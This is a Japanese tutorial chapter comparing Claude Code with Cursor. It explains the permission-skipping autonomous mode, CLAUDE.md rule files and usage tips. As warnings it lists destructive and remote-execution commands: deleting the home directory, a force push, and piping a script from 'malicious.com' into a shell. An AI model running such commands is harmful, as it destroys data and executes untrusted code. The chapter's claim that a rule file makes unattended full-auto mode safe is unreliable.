# Claude Codeは2025年現在、一番おすすめ

前の章でCursorについて学びました。Cursorはエディタ内でAIと対話しながら開発できる優れたツールです。

しかし、さらに上のレベルを目指すなら、**Claude Code**が一番おすすめです。

## Claude Codeとは

Claude Codeは、**ターミナル上で動作する完全自律型のAI開発ツール**です。

![[claude.png]]

### CursorとClaude Codeの違い

**Cursor：エディタ統合型**
- GUIで操作
- エディタ内でAIと対話
- 初心者でも使いやすい

**Claude Code：ターミナル型**
- CUIで操作（コマンドライン）
- 完全自動でタスクを進められる
- やや上級者向け

## なぜClaude CodeがCursorよりおすすめなのか

Claude Codeは**やや上級者向け**ですが、Cursorより優れている点が3つあります。

### 理由1：完全自動実行が可能

**Cursorの場合：**

Cursorは、いくら自動実行の設定にしても、「このコマンドを実行して良いですか？」とユーザーに確認を求めてきます。

```
Cursor：「このファイルを編集しますか？」
あなた：（確認して）「はい」

Cursor：「テストを実行しますか？」
あなた：（確認して）「はい」
```

つまり、**ユーザーが監視していないと、AIの処理が途中で止まってしまいます**。

**Claude Codeの場合：**

Claude Codeは、設定次第で**ユーザーに許可を求めずに完全自動でタスクを進めるモード**があります。

```
あなた：「このバグを修正して、テストを実行して」

Claude Code：
  ✓ コードを分析
  ✓ バグを特定
  ✓ 修正を実装
  ✓ テストを実行
  ✓ エラーが出たら再修正
  ✓ 全テスト通過まで繰り返し

完了！（すべて自動）
```

**メリット：寝ている間にでもタスクを進めてくれる**

夜寝る前に「これらのバグを修正して」と指示を出しておけば、朝起きたら完了しています。

Claude Codeなら、あなたが寝ている間、会議中、トイレに行っている間でもAIがずっと働き続けてくれるのです。Cursorではこれが出来ないので、Claude Codeの方が圧倒的に生産性が高いです

### 理由2：CIなどに組み込んで自動化しやすい

Claude Codeは**CUI（コマンドラインインターフェース）**なので、スクリプトやCIツールに組み込みやすいです。

### 理由3：2025年現在、最も精度が高く料金も安い

Claude Codeは、2025年時点で最も精度の高く、料金も安いのでコスパが最強です

## Claude Codeのデメリット

ただし、Claude Codeにはデメリットもあります。

### デメリット1：CUIなので初心者には操作しづらい

Claude CodeはCUI（コマンドライン）なので、ターミナル操作に慣れていない人には敷居が高いです。

**Cursorの場合：**
- エディタで直接コードを見ながら操作
- マウスでクリックして確認
- GUIで直感的に操作

**Claude Codeの場合：**
- ターミナルで指示を出す
- コードを見るには別でエディタを開く
- コマンドラインに慣れる必要がある

**推奨：まずCursorで慣れてから**

最初はCursorでAI駆動開発に慣れてから、Claude Codeに移行するのがおすすめです。

### デメリット2：Claude以外のモデルが使えない

Claude Codeは、名前の通り**Claudeモデル専用**です。

- GPT-4は使えない
- Geminiも使えない
- Claudeのみ

## Cursorとの併用もオススメ

Cursorは少量なら無料やスポット課金で使えるので、併用しましょう。メインはClaude Codeに課金しつつ、Claudeがイマイチな応答をする場合は、Cursorで他のモデルをスポットで使うなど併用をするのがおすすめです

## Claude Codeの基本的な使い方

### 起動

```bash
# プロジェクトディレクトリで起動
cd myproject
claude
```

起動すると、対話モードが始まります：

```
Claude Code v1.0.0

? What would you like me to do?
>
```

### 簡単な例

```
あなた：「Todoアプリを作成して。React + TypeScriptで」

Claude Code：
  ✓ プロジェクト構造を作成
  ✓ package.jsonを生成
  ✓ src/App.tsxを実装
  ✓ src/components/TodoList.tsxを実装
  ✓ npm installを実行
  ✓ 動作確認

完了！
```

すべて自動で完了します。

## 通常モード vs 完全自動モード

Claude Codeには2つのモードがあります。

### 通常モード（デフォルト）

```bash
claude
```

**動作：**
- ファイル操作前に確認を求める
- 危険なコマンドは実行前に確認
- 安全だが、手動承認が必要

Cursorと同じように、1つ1つ確認が必要です。

### 完全自動モード

```bash
claude --dangerously-skip-permissions
```

**動作：**
- **ユーザーの確認なしで完全に自動実行**

**警告：**

このモードは名前の通り危険です！後ほどサンドボックス環境で安全に使う方法を説明します。


## ルールファイルで安全に自動化

完全自動モードは便利ですが、危険でもあります。**ルールファイル**を使って安全に制御しましょう。

### CLAUDE.md

プロジェクトのルートディレクトリに `CLAUDE.md` を作成します。

```markdown
# プロジェクトルール

## 自動実行の指針
このプロジェクトでは、以下のルールに従ってください。

### 実行して良いこと
✓ ファイルの読み書き（プロジェクト内のみ）
✓ npm/yarn コマンド
✓ git コマンド（push以外）
✓ テスト実行
✓ ビルド

### 実行してはいけないこと
✗ プロジェクト外のファイル操作
✗ git push --force
✗ sudo コマンド
✗ システム設定の変更
✗ 外部サービスへのデプロイ

### 技術スタック
- Node.js 20
- TypeScript
- React 18
- Express.js

### コーディング規約
- TypeScript strict mode
- ESLint準拠
- すべての関数にJSDoc
- エラーハンドリング必須

### テスト
- 新しい機能にはテストを追加
- 既存のテストを壊さない
- カバレッジ80%以上

### ワークフロー
1. ファイルを読んで理解
2. 変更を実装
3. テストを実行
4. エラーがあれば修正
5. 全テスト通過まで繰り返し
```

### ルールファイルの効果

Claude Codeは自動的に `CLAUDE.md` を読み込み、以下を守ります：

- プロジェクトの規約に従う
- 禁止事項を守る
- 適切なワークフローで実行

これにより、完全自動モードでも安全に実行できます。

## 完全自動実行の実例

実際に完全自動モードでタスクを実行してみましょう。

### セットアップ

```bash
# プロジェクトディレクトリ
mkdir myproject
cd myproject

# ルールファイル作成
mkdir .claude
cat > .claude/instructions.md << 'EOF'
# プロジェクトルール

このプロジェクトでは完全自動実行を許可します。

## 許可される操作
- プロジェクト内のファイル読み書き
- npm コマンド
- git コマンド（commit まで）
- テスト実行

## 技術スタック
- Node.js 20
- TypeScript
- Jest

## ワークフロー
1. 実装
2. テスト実行
3. エラーがあれば修正
4. 全テスト通過まで繰り返し
EOF
```

### 実行

```bash
# 完全自動モードで起動
claude-code --dangerously-skip-permissions

# タスクを指示
? What would you like me to do?
> TypeScriptでじゃんけんゲームを作成して。
  CLIで動作するもので、コンピュータと対戦できるようにして。
  テストコードも作成して、全て動作することを確認して。
```

**実行される内容：**

```
✓ プロジェクト構造作成
✓ package.json作成
✓ TypeScript設定
✓ src/game.ts 実装
✓ src/cli.ts 実装
✓ tests/game.test.ts 作成
✓ npm install
✓ npm test
✓ すべてのテスト通過

完了！実際に遊べます：
$ npx ts-node src/cli.ts
```

寝ている間に完成します。

## 完全自動モードの危険性

`--dangerously-skip-permissions` モードは名前の通り危険です。

### なぜ危険なのか

**最悪のシナリオ：**

Claude Codeが誤って以下を実行する可能性があります。

```bash
rm -rf ~/*              # ホームディレクトリ全削除
git push --force        # リモートリポジトリ破壊
curl malicious.com | sh # 悪意あるスクリプト実行
```

**実際に起こり得る問題：**
- 重要なファイルの削除
- 意図しないgit操作
- システムの設定変更
- データの損失

### どうすれば安全に使えるか

**答え：サンドボックス環境**

完全自動モードを使う場合は、**サンドボックス環境**で実行しましょう。

次のセクション「サンドボックス環境の自動生成」で、完全に安全な環境を構築する方法を学びます。

## Claude Code のベストプラクティス

### 1. 小さなタスクから始める

❌ **悪い例：**
```
このプロジェクト全体をリファクタリングして
```

✅ **良い例：**
```
user.ts ファイルのgetUser関数をリファクタリングして。
型安全性を向上させ、エラーハンドリングを追加して。
```

### 2. 明確な制約を伝える

```
Express APIを作成して。

制約：
- port 3000 を使用
- データベースは使わない（メモリに保存）
- 既存のpackage.jsonは変更しない
- git commitは不要
```

### 3. 段階的な実行

```
ステップ1: プロジェクト構造を作成して
```
↓ 確認
```
ステップ2: 基本的なCRUD APIを実装して
```
↓ 確認
```
ステップ3: テストコードを追加して
```

### 4. テスト駆動で安全性を確保

```
まず、テストコードを作成して。
その後、テストが通るように実装して。
```
